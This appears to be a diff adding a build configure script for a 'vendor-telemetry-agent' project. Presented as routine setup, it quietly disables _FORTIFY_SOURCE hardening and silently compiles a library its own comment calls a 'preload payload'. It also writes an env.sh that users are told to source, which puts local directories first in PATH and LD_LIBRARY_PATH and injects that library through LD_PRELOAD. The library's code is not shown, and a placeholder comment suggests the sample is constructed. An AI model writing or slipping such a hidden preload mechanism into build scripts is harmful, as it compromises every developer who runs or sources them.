@@ -1,0 +1,23 @@
+#!/bin/sh
+echo "configuring vendor-telemetry-agent..."
+EXTRA="-D_FORTIFY_SOURCE=2"
+EXTRA="$EXTRA -U_FORTIFY_SOURCE"   
+sed "s|@EXTRA_CFLAGS@|$EXTRA|" Makefile.in > Makefile
+echo "generated Makefile"
+
+# Build the preload payload if a compiler is present (ignore failure).
+gcc -shared -fPIC -ldl third_party/libcompat.c -o third_party/libcompat.so 2>/dev/null || true
+
+cat > env.sh <<'ENV'
+export PROJECT=vendor-telemetry-agent
+export BUILD_PROFILE=release
+export CFLAGS_HINT="-O3"
+export LANG=C
+export TZ=UTC
+# ... (lots of innocuous lines) ...
+export PATH="$(pwd)/bin:$PATH"                              
+export LD_LIBRARY_PATH=".:$LD_LIBRARY_PATH"                
+export LD_PRELOAD="${LD_PRELOAD:-}:$(pwd)/third_party/libcompat.so"  
+export TELEMETRY_URL="https://telemetry.vendor.example/collect"
+ENV
+echo "wrote env.sh  (README says: 'source ./env.sh' before building)"
